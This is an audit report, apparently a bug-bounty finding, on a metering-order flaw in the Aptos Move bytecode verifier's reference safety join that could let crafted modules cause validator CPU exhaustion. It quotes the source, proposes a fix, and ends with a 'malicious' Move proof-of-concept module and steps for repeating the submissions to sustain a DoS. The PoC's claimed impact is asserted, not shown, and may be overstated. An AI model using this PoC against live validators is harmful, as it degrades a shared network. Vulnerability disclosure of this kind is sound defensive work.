# Audit Report

## Title
Join Metering Time-of-Check to Time-of-Use Vulnerability in Reference Safety Verifier Allows Validator DoS

## Summary
The reference safety verifier's `join` method performs expensive O(E1 × E2) borrow graph join operations before charging the complexity meter, allowing an attacker to submit malicious Move bytecode that causes validator nodes to consume excessive CPU time during verification before the meter limit can reject the module.

## Finding Description

The bytecode verifier uses a metering system to limit verification complexity and prevent DoS attacks. However, the reference safety analyzer has a critical ordering bug where expensive computation occurs before metering. [1](#0-0) 

At this join point, the `AbstractState::join` implementation in reference safety is called: [2](#0-1) 

The expensive `Self::join_(self, state)` operation executes **before** any meter charges. This internal join performs borrow graph merging: [3](#0-2) 

The `borrow_graph.join()` call invokes `unmatched_edges()` which has O(E1 × E2) computational complexity: [4](#0-3) [5](#0-4) 

This contrasts with the **correct** implementation in locals safety, which meters **before** the join: [6](#0-5) 

**Attack Scenario:**
1. Attacker crafts Move bytecode with nested loops (up to depth 5 per production config)
2. Loops contain operations that create complex borrow graphs with many references and edges
3. At each loop back edge, the verifier performs a join operation
4. The O(E1 × E2) `unmatched_edges` computation executes before meter checks
5. CPU time is consumed before the meter can detect excessive complexity and reject the module
6. With max 1024 basic blocks, the attacker can trigger many expensive joins [7](#0-6) 

## Impact Explanation

This is a **High Severity** vulnerability per Aptos bug bounty criteria: "Validator node slowdowns."

When validators receive transactions containing malicious Move modules, they must verify the bytecode before execution. This vulnerability allows an attacker to force validators to spend excessive CPU time (seconds to minutes per module) processing expensive join operations before the meter limit (80,000,000 units) can reject the module.

**Impact:**
- Validator nodes experience CPU exhaustion during module verification
- Transaction processing throughput degrades
- Mempool becomes congested with malicious verification requests
- Potential for sustained DoS by repeatedly submitting malicious modules
- All validators are affected when verifying the same malicious module in a block

This breaks the critical invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits."

## Likelihood Explanation

**Likelihood: High**

- **Attacker Requirements:** Only ability to submit Move module transactions (no special privileges)
- **Complexity:** Medium - requires understanding of Move bytecode and borrow graph construction, but patterns can be automated
- **Detection:** Difficult to distinguish from legitimate complex modules until excessive CPU consumption occurs
- **Frequency:** Can be triggered repeatedly by submitting multiple malicious modules
- **Cost to Attacker:** Only transaction fees for module publication attempts (which may fail verification eventually)

## Recommendation

Reorder the metering to occur **before** the expensive join operation, matching the pattern used in locals safety verification:

```rust
fn join(
    &mut self,
    state: &AbstractState,
    meter: &mut impl Meter,
) -> PartialVMResult<JoinResult> {
    // METER FIRST - before expensive operations
    meter.add(Scope::Function, JOIN_BASE_COST)?;
    meter.add_items(Scope::Function, JOIN_PER_LOCAL_COST, self.locals.len())?;
    meter.add_items(
        Scope::Function,
        JOIN_PER_GRAPH_ITEM_COST,
        self.borrow_graph.graph_size(),
    )?;
    
    // THEN perform expensive join
    let joined = Self::join_(self, state);
    assert!(joined.is_canonical());
    
    let locals_unchanged = self
        .locals
        .iter()
        .zip(&joined.locals)
        .all(|(self_value, joined_value)| self_value == joined_value);
    
    if locals_unchanged && self.borrow_graph.leq(&joined.borrow_graph) {
        Ok(JoinResult::Unchanged)
    } else {
        *self = joined;
        Ok(JoinResult::Changed)
    }
}
```

Alternatively, meter based on **both** input graph sizes before the join to better estimate the O(E1 × E2) cost:

```rust
meter.add_items(
    Scope::Function,
    JOIN_PER_GRAPH_ITEM_COST,
    self.borrow_graph.graph_size()
        .saturating_mul(state.borrow_graph.graph_size()),
)?;
```

## Proof of Concept

```move
// File: malicious_module.move
module 0x1::dos_verifier {
    struct Container has drop {
        val: u64
    }

    // Creates complex borrow graph through nested loops
    public fun attack() {
        let x = Container { val: 0 };
        let i = 0;
        while (i < 100) {
            // Create borrow chain
            let r1 = &mut x;
            let r2 = &mut r1.val;
            let r3 = &mut *r2;
            
            // Nested loop creates more complexity
            let j = 0;
            while (j < 50) {
                let r4 = &mut *r3;
                let r5 = &mut *r4;
                *r5 = *r5 + 1;
                j = j + 1;
            };
            
            i = i + 1;
        };
    }
}
```

**Exploitation Steps:**
1. Compile the malicious Move module to bytecode
2. Submit as a module publication transaction to a validator
3. Validator's bytecode verifier enters reference safety analysis
4. Each loop back edge triggers expensive join operations
5. CPU time accumulates before meter checks can reject
6. Monitor validator CPU usage spike during verification
7. Repeat with multiple transactions to sustain DoS

**Expected Behavior:** Validator experiences significant CPU consumption (multiple seconds) before eventually rejecting the module with "program too complex" error, but only after the damage is done.

### Citations

**File:** third_party/move/move-bytecode-verifier/src/absint.rs (L99-102)
```rust
                        let join_result = {
                            let old_pre = &mut next_block_invariant.pre;
                            old_pre.join(&post_state, meter)
                        }?;
```

**File:** third_party/move/move-bytecode-verifier/src/reference_safety/abstract_state.rs (L663-693)
```rust
    pub fn join_(&self, other: &Self) -> Self {
        assert!(self.current_function == other.current_function);
        assert!(self.is_canonical() && other.is_canonical());
        assert!(self.next_id == other.next_id);
        assert!(self.locals.len() == other.locals.len());
        let mut self_graph = self.borrow_graph.clone();
        let mut other_graph = other.borrow_graph.clone();
        let locals = self
            .locals
            .iter()
            .zip(&other.locals)
            .map(|(self_value, other_value)| {
                match (self_value, other_value) {
                    (AbstractValue::Reference(id), AbstractValue::NonReference) => {
                        self_graph.release(*id);
                        AbstractValue::NonReference
                    },
                    (AbstractValue::NonReference, AbstractValue::Reference(id)) => {
                        other_graph.release(*id);
                        AbstractValue::NonReference
                    },
                    // The local has a value on each side, add it to the state
                    (v1, v2) => {
                        assert!(v1 == v2);
                        *v1
                    },
                }
            })
            .collect();

        let borrow_graph = self_graph.join(&other_graph);
```

**File:** third_party/move/move-bytecode-verifier/src/reference_safety/abstract_state.rs (L708-722)
```rust
    fn join(
        &mut self,
        state: &AbstractState,
        meter: &mut impl Meter,
    ) -> PartialVMResult<JoinResult> {
        let joined = Self::join_(self, state);
        assert!(joined.is_canonical());
        assert!(self.locals.len() == joined.locals.len());
        meter.add(Scope::Function, JOIN_BASE_COST)?;
        meter.add_items(Scope::Function, JOIN_PER_LOCAL_COST, self.locals.len())?;
        meter.add_items(
            Scope::Function,
            JOIN_PER_GRAPH_ITEM_COST,
            self.borrow_graph.graph_size(),
        )?;
```

**File:** third_party/move/move-borrow-graph/src/graph.rs (L334-363)
```rust
    fn unmatched_edges(&self, other: &Self) -> BTreeMap<RefID, BorrowEdges<Loc, Lbl>> {
        let mut unmatched_edges = BTreeMap::new();
        for (parent_id, other_ref) in &other.0 {
            let self_ref = &self.0[parent_id];
            let self_borrowed_by = &self_ref.borrowed_by.0;
            for (child_id, other_edges) in &other_ref.borrowed_by.0 {
                for other_edge in other_edges {
                    let found_match = self_borrowed_by
                        .get(child_id)
                        .map(|parent_to_child| {
                            parent_to_child
                                .iter()
                                .any(|self_edge| self_edge.leq(other_edge))
                        })
                        .unwrap_or(false);
                    if !found_match {
                        assert!(parent_id != child_id);
                        unmatched_edges
                            .entry(*parent_id)
                            .or_insert_with(BorrowEdges::new)
                            .0
                            .entry(*child_id)
                            .or_insert_with(BorrowEdgeSet::new)
                            .insert(other_edge.clone());
                    }
                }
            }
        }
        unmatched_edges
    }
```

**File:** third_party/move/move-borrow-graph/src/graph.rs (L393-409)
```rust
    pub fn join(&self, other: &Self) -> Self {
        debug_assert!(self.check_invariant());
        debug_assert!(other.check_invariant());
        debug_assert!(self.0.keys().all(|id| other.0.contains_key(id)));
        debug_assert!(other.0.keys().all(|id| self.0.contains_key(id)));

        let mut joined = self.clone();
        for (parent_id, unmatched_borrowed_by) in self.unmatched_edges(other) {
            for (child_id, unmatched_edges) in unmatched_borrowed_by.0 {
                for unmatched_edge in unmatched_edges {
                    joined.add_edge(parent_id, unmatched_edge, child_id);
                }
            }
        }
        debug_assert!(joined.check_invariant());
        joined
    }
```

**File:** third_party/move/move-bytecode-verifier/src/locals_safety/abstract_state.rs (L140-151)
```rust
    fn join(
        &mut self,
        state: &AbstractState,
        meter: &mut impl Meter,
    ) -> PartialVMResult<JoinResult> {
        meter.add(Scope::Function, JOIN_BASE_COST)?;
        meter.add_items(
            Scope::Function,
            JOIN_PER_LOCAL_COST,
            state.local_states.len(),
        )?;
        let joined = Self::join_(self, state);
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L157-176)
```rust
        max_loop_depth: Some(5),
        max_generic_instantiation_length: Some(32),
        max_function_parameters: Some(128),
        max_basic_blocks: Some(1024),
        max_value_stack_size: 1024,
        max_type_nodes: if enable_function_values {
            Some(128)
        } else {
            Some(256)
        },
        max_push_size: Some(10000),
        max_struct_definitions: None,
        max_struct_variants: None,
        max_fields_in_struct: None,
        max_function_definitions: None,
        max_back_edges_per_function: None,
        max_back_edges_per_module: None,
        max_basic_blocks_in_script: None,
        max_per_fun_meter_units: Some(1000 * 80000),
        max_per_mod_meter_units: Some(1000 * 80000),
```
